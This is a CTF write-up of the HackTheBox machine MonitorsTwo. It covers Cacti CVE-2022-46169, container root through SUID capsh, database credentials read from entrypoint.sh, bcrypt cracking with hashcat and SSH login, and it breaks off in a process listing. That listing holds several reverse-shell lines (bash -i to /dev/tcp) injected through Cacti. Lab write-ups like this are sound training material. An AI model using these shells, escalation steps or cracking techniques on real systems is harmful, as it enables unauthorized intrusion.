---
layout: post
title: "MonitorsTwo writeup"
tags: ["Writeups", "HackTheBox", "CTF", "Cacti-1.2.22", "CVE-2022-46169", "Docker-Container-Breakout", "Docker-Enumeration", "Brute-Force", "Docker-20.10.5", "CVE-2021-41091"]
authors:
  - name: Federico Fantini
    url: "https://federicofantini.net"
meta: "This box starts with a website hosting Cacti version 1.2.22 that is vulnerable to CVE-2022-46169. Just follow the automated steps in the exploit on github to get a shell as www-data. The enumeration continues, I'm inside a docker container, thanks to a weakness in the capsh binary I can become root of the container. Docker breakout? Unfourtunally not, I searched a lot but I didn't find anything to break through the docker container. As well as seeing how the system is setup, to continue just look at the /entrypoint.sh script, connect to the MYSQL db in the other container, enumerate it, find the hashed credentials for the user marcus and do the classic bruteforce attack with rockyou.txt. Finally to become root just read the mailbox for user marcus, it is explained by the system administrators what vulnerabilities there are and the exploits are on github."
---

# INDEX
- [INDEX](#index)
  - [Enumeration](#enumeration)
  - [Docker container breakout](#docker-container-breakout)
  - [Privesc www-data](#privesc-www-data)
  - [Privesc marcus](#privesc-marcus)

<br><br>

*[Image: MonitorsTwo box HTB]*

## Enumeration

- `nmap -A -p- -T4 10.10.11.211`
    ```
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
    |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
    |_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Login to Cacti
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

- The site shows the login page of the [**cacti**](https://github.com/Cacti/cacti) software, from the source of the page I can get the version:
    ```html
    <div class='versionInfo'>Version 1.2.22 | (c) 2004-2023 - The Cacti Group</div>
    ```

    I google if there are any CVEs on this specific version and I find one: `CVE-2022-46169`
    
    The corresponding exploit: [https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit](https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit)

    Just follow the steps in the repo to get a shell as `www-data`

<br><br>

## Docker container breakout

- I run `linpeas.sh`:
    ```
    ╔══════════╣ Executing Linux Exploit Suggester 2
    ╚ https://github.com/jondonas/linux-exploit-suggester-2
    
    ╔══════════╣ Protections
    ═╣ AppArmor enabled? .............. AppArmor Not Found
    ═╣ AppArmor profile? .............. docker-default (enforce)
    ═╣ is linuxONE? ................... s390x Not Found
    ═╣ grsecurity present? ............ grsecurity Not Found
    ═╣ PaX bins present? .............. PaX Not Found
    ═╣ Execshield enabled? ............ Execshield Not Found
    ═╣ SELinux enabled? ............... sestatus Not Found
    ═╣ Seccomp enabled? ............... enabled
    ═╣ User namespace? ................ enabled
    ═╣ Cgroup2 enabled? ............... enabled
    ═╣ Is ASLR enabled? ............... Yes
    ═╣ Printer? ....................... No
    ═╣ Is this a virtual machine? ..... Yes
    ```

    ```
                                       ╔═══════════╗
    ═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                       ╚═══════════╝
    ╔══════════╣ Container related tools present (if any):
    ╔══════════╣ Am I Containered?
    ╔══════════╣ Container details
    ═╣ Is this a container? ........... docker
    ═╣ Any running containers? ........ No
    ╔══════════╣ Docker Container details
    ═╣ Am I inside Docker group ....... No
    ═╣ Looking and enumerating Docker Sockets (if any):
    ═╣ Docker version ................. Not Found
    ═╣ Vulnerable to CVE-2019-5736 .... Not Found
    ═╣ Vulnerable to CVE-2019-13139 ... Not Found
    ═╣ Rootless Docker? ............... No
    ```

    ```
    ╔══════════╣ Container & breakout enumeration
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout                                                                                                                                                          
    ═╣ Container ID ................... 50bca5e748b0
    ═╣ Container Full ID .............. 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
    ═╣ Seccomp enabled? ............... enabled
    ═╣ AppArmor profile? .............. docker-default (enforce)
    ═╣ User proc namespace? ........... enabled         0          0 4294967295
    ═╣ Vulnerable to CVE-2019-5021 .... No
    ```

    ```                                                                         
    ══╣ Breakout via mounts
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts                                                                                                    
    ═╣ /proc mounted? ................. Yes
    ═╣ /dev mounted? .................. No
    ═╣ Run ushare ..................... No
    ═╣ release_agent breakout 1........ No
    ═╣ release_agent breakout 2........ No
    ═╣ core_pattern breakout .......... No
    ═╣ binfmt_misc breakout ........... No
    ═╣ uevent_helper breakout ......... No
    ═╣ is modprobe present ............ No
    ═╣ DoS via panic_on_oom ........... No
    ═╣ DoS via panic_sys_fs ........... No
    ═╣ DoS via sysreq_trigger_dos ..... No
    ═╣ /proc/config.gz readable ....... No
    ═╣ /proc/sched_debug readable ..... Yes
    ═╣ /proc/*/mountinfo readable ..... Yes
    ═╣ /sys/kernel/security present ... Yes
    ═╣ /sys/kernel/security writable .. No
    ```                                                                                                                                                                

    ```                                    
    ══╣ Namespaces
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces
    total 0
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 cgroup -> cgroup:[4026531835]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 ipc -> ipc:[4026532656]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 mnt -> mnt:[4026532654]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 net -> net:[4026532659]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 pid -> pid:[4026532657]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 pid_for_children -> pid:[4026532657]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 user -> user:[4026531837]
    lrwxrwxrwx 1 www-data www-data 0 May 11 15:14 uts -> uts:[4026532655]
    ```

    ```
    ╔══════════╣ Container Capabilities
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape                                                                                           
    
    Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip                                                                         
    
    Bounding set =cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap
    
    Ambient set =
    Current IAB: cap_chown,!cap_dac_override,!cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,cap_sys_chroot,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
    
    Securebits: 00/0x0/1'b0
    secure-noroot: no (unlocked)
    secure-no-suid-fixup: no (unlocked)
    secure-keep-caps: no (unlocked)
    secure-no-ambient-raise: no (unlocked)
    uid=33(root) euid=0(root)
    gid=33(www-data)
    groups=33(www-data)
    Guessed mode: UNCERTAIN (0)
    ```

    ```
    ╔══════════╣ Possible Entrypoints
    -rw-r--r-- 1 root     root      648 Jan  5 11:37 /entrypoint.sh
    -rw-r--r-- 1 www-data www-data 811K Apr 25 08:27 /tmp/linpeas.sh
    -rwxr-xr-x 1 www-data www-data  46K May  9 09:05 /tmp/linenum.sh
    -rwxr-xr-x 1 www-data www-data  648 May 11 14:54 /tmp/entrypoint.sh
    ```

    ```
    ╔══════════╣ Searching ssl/ssh files
    ══╣ Possible private SSH keys were found!
    /var/www/html/include/vendor/phpseclib/Crypt/RSA.php
    ```

    ```
    ╔══════════╣ Unexpected in root
    /.dockerenv
    /entrypoint.sh
    ```

    ```
    ╔══════════╣ Searching passwords in config PHP files
    #$rdatabase_password = 'cactiuser';
    $database_password = 'root';
    $password = $value;
    $password = $database_password;
    ```

    ```
                          ╔════════════════════════════════════╗
    ══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                        ╚════════════════════════════════════╝                                                                                                                                                                                
    ╔══════════╣ SUID - Check easy privesc, exploits and write perms
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
    strace Not Found
    -rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
    -rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
    -rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
    -rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
    -rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
    -rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
    -rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
    -rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
    ```

- As linpeas says I'm inside a docker container, I can become root of the container by simply following: https://gtfobins.github.io/gtfobins/capsh/

    `capsh --gid=0 --uid=0 --`

- At this point I *"wasted" (it was fun)* a lot of time trying to breakout the docker container, I list all the resources I tried:
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#capabilities-abuse-escape
    - https://docs.docker.com/engine/security/seccomp/
    - https://github.com/moby/moby/blob/master/profiles/seccomp/default.json
    - https://pet2cattle.com/2022/01/container-escape
    - https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_chroot
    - https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf
    - https://github.com/earthquake/chw00t/
    - https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_net_raw

- Here is a small summary:
    - [**cap_net_raw**: I could at best see network traffic or craft malicious packets](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_net_raw)
    - [**cap_sys_chroot**: permits the use of the chroot system call but inside the container](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_chroot)
    - [`cat /proc/sched_debug`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-sched_debug) &#8594; empty file
    - [`ls -al /sys/kernel/security`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#sys-kernel-security) &#8594; empty folder
    - [`cat /proc/$$/mountinfo`](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts#proc-pid-mountinfo)
        ```
        695 594 0:62 / / rw,relatime master:274 - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off
        696 695 0:65 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
        697 695 0:66 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
        698 697 0:67 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
        699 695 0:68 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
        700 699 0:69 / /sys/fs/cgroup rw,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755
        701 700 0:31 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/systemd ro,nosuid,nodev,noexec,relatime master:11 - cgroup cgroup rw,xattr,name=systemd
        702 700 0:34 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/rdma ro,nosuid,nodev,noexec,relatime master:15 - cgroup cgroup rw,rdma
        703 700 0:35 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/net_cls,net_prio ro,nosuid,nodev,noexec,relatime master:16 - cgroup cgroup rw,net_cls,net_prio
        704 700 0:36 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexec,relatime master:17 - cgroup cgroup rw,cpuset
        705 700 0:37 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/memory ro,nosuid,nodev,noexec,relatime master:18 - cgroup cgroup rw,memory
        706 700 0:38 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,relatime master:19 - cgroup cgroup rw,pids
        707 700 0:39 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/freezer ro,nosuid,nodev,noexec,relatime master:20 - cgroup cgroup rw,freezer
        708 700 0:40 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/devices ro,nosuid,nodev,noexec,relatime master:21 - cgroup cgroup rw,devices
        709 700 0:41 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec,relatime master:22 - cgroup cgroup rw,blkio
        710 700 0:42 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,noexec,relatime master:23 - cgroup cgroup rw,cpu,cpuacct
        711 700 0:43 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/perf_event ro,nosuid,nodev,noexec,relatime master:24 - cgroup cgroup rw,perf_event
        712 700 0:44 /docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noexec,relatime master:25 - cgroup cgroup rw,hugetlb
        713 697 0:64 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
        714 695 8:2 /root/cacti/entrypoint.sh /entrypoint.sh rw,relatime - ext4 /dev/sda2 rw
        715 695 8:2 /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda2 rw
        716 695 8:2 /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/hostname /etc/hostname rw,relatime - ext4 /dev/sda2 rw
        717 695 8:2 /var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/hosts /etc/hosts rw,relatime - ext4 /dev/sda2 rw
        718 697 0:63 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k
        595 696 0:65 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
        640 696 0:65 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
        656 696 0:65 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
        657 696 0:65 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
        658 696 0:65 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
        659 696 0:70 / /proc/acpi ro,relatime - tmpfs tmpfs ro
        662 696 0:66 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
        663 696 0:66 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
        664 696 0:66 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
        665 696 0:66 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
        666 696 0:71 / /proc/scsi ro,relatime - tmpfs tmpfs ro
        667 699 0:72 / /sys/firmware ro,relatime - tmpfs tmpfs ro
        ```

        I don't see any juicy information except:
        ```
        714 695 8:2 /root/cacti/entrypoint.sh /entrypoint.sh rw,relatime - ext4 /dev/sda2 rw
        ```

<br><br>

## Privesc www-data

- `cat /entrypoint.sh`
    ```bash
    #!/bin/bash
    set -ex

    wait-for-it db:3306 -t 300 -- echo "database is connected"
    if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
        mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
        mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
        mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
    fi

    chown www-data:www-data -R /var/www/html
    # first arg is `-f` or `--some-option`
    if [ "${1#-}" != "$1" ]; then
            set -- apache2-foreground "$@"
    fi

    exec "$@"
    ```

    `mysql --host=db --user=root --password=root cacti -e "select * from user_auth"`
    ```
    id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts        policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms

    1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb           on      on      on      on      on      2       1       1       1       1       on      -1      -1 -1               0       0       663348655
    
    3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1      -1              0       0       0
    
    4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1       1       1       1       1       on      -1      -1 on       0       0       2135691668
    ```

    `hashcat -a 0 -m 3200 hashes.txt rockyou.txt -w 3 -O`
    ```
    $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
    ```

    `sshpass -p 'funkymonkey' ssh marcus@10.10.11.211` &#8594; bingo!

<br><br>

## Privesc marcus

- I run `linpeas.sh` another time: 

    ```
                    ╔════════════════════════════════════════════════╗
    ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                    ╚════════════════════════════════════════════════╝
    ╔══════════╣ Cleaned processes
    ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
    
    root        1332  8.1  0.2 1871684 8840 ?        Sl   13:58  16:00  _ /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.19.0.3 -container-port 80

    root        1234  0.0  0.2 1451676 11060 ?       Sl   13:58   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock
    
    root        1347  1.3  0.3 1526816 12388 ?       Sl   13:58   2:37 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock
    ```

    ```
    ╔══════════╣ Unix Sockets Listening
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
    
    /org/kernel/linux/storage/multipathd
    /run/containerd/containerd.sock
    /run/containerd/containerd.sock.ttrpc
    /run/containerd/s/3d0e892b2368988ed864212a06a26fc0d3026d9d352244a0de8476d495a42d24
    /run/containerd/s/7e9e38233b837179435001338e8ed956bc31f9552bcb32ce4ac3ecc10dd42d4e
    /run/dbus/system_bus_socket
    └─(Read Write)
    /run/docker.sock
    /var/run/docker/libnetwork/ddef31f2ba37.sock
    /var/run/docker/metrics.sock
    ```

    ```
    ╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
    Apache version: apache2 Not Found
    httpd Not Found
    
    Nginx version: 
    ══╣ Nginx modules
    ngx_http_image_filter_module.so
    ngx_http_xslt_filter_module.so
    ngx_mail_module.so
    ngx_stream_module.so
    ══╣ PHP exec extensions
    drwxr-xr-x 2 root root 4096 Mar 22 13:21 /etc/nginx/sites-enabled
    lrwxrwxrwx 1 root root 34 Jan  9 10:03 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
    
    server {
            listen 80 default_server;
            listen [::]:80 default_server;
            server_name cacti.monitorstwo.htb;
            server_name _;
            location / {
                    proxy_pass http://127.0.0.1:8080/;
            }
    }
    ```

    ```
    ╔══════════╣ Searching ssl/ssh files
    PermitRootLogin yes
    ```

    ```
    ╔══════════╣ Searching docker files (limit 70)
    ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
    
    lrwxrwxrwx 1 root root 33 Jan  5 09:50 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
    -rw-r--r-- 1 root root 295 Feb 25  2021 /usr/lib/systemd/system/docker.socket
    -rw-r--r-- 1 root root 0 Jan  5 09:50 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
    ```

    ```
    ╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
    /home/marcus
    /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
    /sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
    ```

    - reference for systemd cgroups: https://opensource.com/article/20/10/cgroups

    - `systemctl -t slice --all`
        ```
        UNIT                  LOAD   ACTIVE SUB    DESCRIPTION           
        -.slice               loaded active active Root Slice            
        system-getty.slice    loaded active active system-getty.slice    
        system-modprobe.slice loaded active active system-modprobe.slice 
        system.slice          loaded active active System Slice          
        user-1000.slice       loaded active active User Slice of UID 1000
        user.slice            loaded active active User and Session Slice

        LOAD   = Reflects whether the unit definition was properly loaded.
        ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
        SUB    = The low-level unit activation state, values depend on unit type.

        6 loaded units listed.
        To show all installed unit files use 'systemctl list-unit-files'.
        ```

    - `systemd-cgls` (explore the cgroup hierarchy)
        ```
        ├─user.slice 
        │ └─user-1000.slice 
        │   ├─session-10.scope 
        │   │ ├─38196 sshd: marcus [priv]
        │   │ ├─38285 sshd: marcus@pts/1
        │   │ └─38286 -bash
        │   ├─user@1000.service 
        │   │ ├─init.scope 
        │   │ │ ├─6413 /lib/systemd/systemd --user
        │   │ │ └─6415 (sd-pam)
        │   │ └─gpg-agent.service 
        │   │   └─30485 /usr/bin/gpg-agent --supervised
        │   ├─session-14.scope 
        │   │ ├─108223 sshd: marcus [priv]
        │   │ ├─108316 sshd: marcus@pts/4
        │   │ └─108317 -bash
        │   ├─session-11.scope 
        │   │ ├─ 39236 sshd: marcus [priv]
        │   │ ├─ 39364 sshd: marcus@pts/2
        │   │ ├─ 39365 -bash
        │   │ ├─ 55943 bash
        │   │ ├─ 55950 bash -p
        │   │ ├─ 90807 bash -p
        │   │ ├─ 90817 script /dev/null -c bash
        │   │ ├─ 90818 bash
        │   │ ├─ 90827 bash -p
        │   │ ├─ 90842 less /etc/passwd
        │   │ ├─ 90850 sh -c /bin/bash -c sh
        │   │ ├─ 90851 sh
        │   │ ├─ 90854 bash -p
        │   │ ├─ 90862 less /etc/passwd
        │   │ ├─ 90878 sh -c /bin/bash -c /bin/sh
        │   │ ├─ 90879 /bin/sh
        │   │ ├─ 90881 bash -p
        │   │ ├─108208 vim.tiny /etc/shadow
        │   │ └─108210 /bin/bash
        │   └─session-12.scope 
        │     ├─ 67821 sshd: marcus [priv]
        │     ├─ 69044 sshd: marcus@pts/0
        │     ├─ 69143 -bash
        │     ├─127712 systemd-cgls
        │     └─127713 pager
        ```
    
        Nothing interesting... there are also cgroups related to docker containers:
        ```
        ├─docker 
        │ ├─e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 
        │ │ └─1255 mysqld
        │ └─50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e 
        │   ├─  1376 apache2 -DFOREGROUND
        │   ├─  1565 apache2 -DFOREGROUND
        │   ├─  1615 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.103/9999 0>&1'
        │   ├─  1617 bash -c bash -i >& /dev/tcp/10.10.14.103/9999 0>&1
        │   ├─  1618 bash -i
        │   ├─  1731 apache2 -DFOREGROUND
        │   ├─  1785 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.3/5577 0>&1'
        │   ├─  1787 bash -c bash -i >& /dev/tcp/10.10.14.3/5577 0>&1
        │   ├─  1788 bash -i
        │   ├─  1790 script -qc /bin/bash /dev/null
        │   ├─  1791 sh -c /bin/bash
        │   ├─  1792 /bin/bash
        │   ├─  2091 /bin/bash
        │   ├─  2093 /bin/bash
        │   ├─  2095 /bin/bash
        │   ├─  2194 bash -p
        │   ├─  2367 apache2 -DFOREGROUND
        │   ├─  2391 apache2 -DFOREGROUND
        │   ├─  2393 apache2 -DFOREGROUND
        │   ├─  2515 php
        │   ├─  2544 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.3/5577 0>&1'
        │   ├─  2546 bash -c bash -i >& /dev/tcp/10.10.14.3/5577 0>&1
        │   ├─  2547 bash -i
        │   ├─  2554 script -qc /bin/bash /dev/null
        │   ├─  2555 sh -c /bin/bash
        │   ├─  2556 /bin/bash
        │   ├─  2615 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.38/4444 0>&1'
        │   ├─  2617 bash -c bash -i >& /dev/tcp/10.10.14.38/4444 0>&1
        │   ├─  2618 bash -i
        │   ├─  2880 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.42/789 0>&1'
        │   ├─  2882 bash -c bash -i >& /dev/tcp/10.10.16.42/789 0>&1
        │   ├─  2883 bash -i
        │   ├─  3391 bash -p
        │   ├─  3436 script /dev/null -c bash
        │   ├─  3437 sh -c bash
        │   ├─  3438 bash
        │   ├─  3918 apache2 -DFOREGROUND
        │   ├─  3965 apache2 -DFOREGROUND
        │   ├─  4074 apache2 -DFOREGROUND
        │   ├─  4082 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.47/1337 0>&1'
        │   ├─  4084 bash -c bash -i >& /dev/tcp/10.10.14.47/1337 0>&1
        │   ├─  4085 bash -i
        │   ├─  5077 /bin/bash
